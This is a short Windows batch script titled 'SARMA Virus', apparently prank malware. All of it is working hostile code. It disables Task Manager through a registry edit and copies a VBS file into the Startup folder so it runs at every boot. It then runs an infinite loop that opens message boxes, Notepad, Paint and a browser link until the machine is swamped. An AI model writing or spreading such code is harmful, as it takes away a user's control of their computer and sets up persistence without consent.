@echo off
title SARMA Virus
color 4
echo WARNING: Your system is infected with SARMA Virus!
ping localhost -n 2 >nul

:: Disable Task Manager (Temporary)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

:: Copy Fake Error Script to Startup (So it runs on every boot)
copy WinWagon.vbs "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WinWagon.vbs" /Y

:: Start the Fake Error Immediately
start %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WinWagon.vbs

:: Infinite Loop of Annoyances
:start
start cmd /c "msg * Warning: SARMA Virus Detected!"
start cmd /c "start notepad"
start cmd /c "start mspaint"
start cmd /c "start https://www.youtube.com/watch?v=dQw4w9WgXcQ"
ping localhost -n 2 >nul
goto start
